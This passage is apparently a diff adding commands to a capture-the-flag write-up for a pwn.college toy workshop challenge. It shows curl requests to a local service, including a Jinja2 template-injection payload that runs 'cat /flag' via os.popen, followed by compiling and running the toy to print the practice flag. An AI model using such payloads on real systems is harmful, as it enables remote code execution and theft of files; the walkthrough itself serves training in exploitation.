@@ -1651,6 +1651,7 @@ For thinkering there are two options, we can either replace parts of the templat
 
 ```bash
 $ curl -s -X POST -H "Content-Type: application/json" -d '{"template":"teddy.c.j2"}' http://127.0.0.1/create
+
 {"toy_id":"fe371ffc9ce21bd9"}
 ```
 
@@ -1659,6 +1660,9 @@ $ curl -s -X POST -H "Content-Type: application/json" -d '{"template":"teddy.c.j
 The trickiest part here was to work around the multiple levels of quoted strings inside quoted strings inside quoted strings. But with some experimentation, here's the working payload:
 
 ```bash
+$ curl -X POST -H "Content-Type: application/json" -d "{\"op\":\"replace\",\"index\":192,\"length\":1000,\"content\":\"request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read().strip()}}\\\");}\"}" http://127.0.0.1/tinker/fe371ffc9ce21bd9
+
+{"status":"tinkered"}
 ```
 
 <div class="box-note">
@@ -1669,12 +1673,33 @@ The payload cuts the rest of the C code after successfuly closing the functions,
 
 When we render the payload we don't need anything in the context, so w can just use a dummy variable:
 ```bash
+$ curl -s -X POST -H "Content-Type: application/json" -d '{ "op": "render", "context": { "bubu": "dummy" } }' http://127.0.0.1/tinker/fe371ffc9ce21bd9
 
+{"status":"tinkered"}
+```
+
+In practice mode, at this stage we can verify the template has been rendered as expected:
+```bash
+$ sudo cat /run/workshop/tinkering/0841ce1d1a8a65f9142138a1b7e2be07682ac46c5d7bb876e258c5b2b3a2d352
+/* Teddy Bear */
+#include <stdio.h>
+#include <string.h>
+
+int main(void) {
+    char note[80];
+
+    setbuf(stdout, NULL);
+    puts("soft hug!");
+
+    printf("teddy keeps this secret: %s\n", "pwn.college{practice}");}
 ```
 
 **Step 4 - Assemble the toy**
 
 ```bash
+$ curl -s -X POST -H "Content-Type: application/json" http://127.0.0.1/assemble/fe371ffc9ce21bd9
+
+{"status":"assembled"}
 ```
 
 **Step 5 - Play!**
@@ -1682,4 +1707,7 @@ When we render the payload we don't need anything in the context, so w can just 
 Play with the toy, which runs the compiled binary, which includes the flag rendered in the previous step:
 
 ```bash
+$ curl -s -X POST -H "Content-Type: application/json" -d '{"stdin":"hello"}' http://127.0.0.1/play/fe371ffc9ce21bd9
+
+{"returncode":0,"stderr":"","stdout":"soft hug!\nteddy keeps this secret: pwn.college{practice}\n"}
 ```
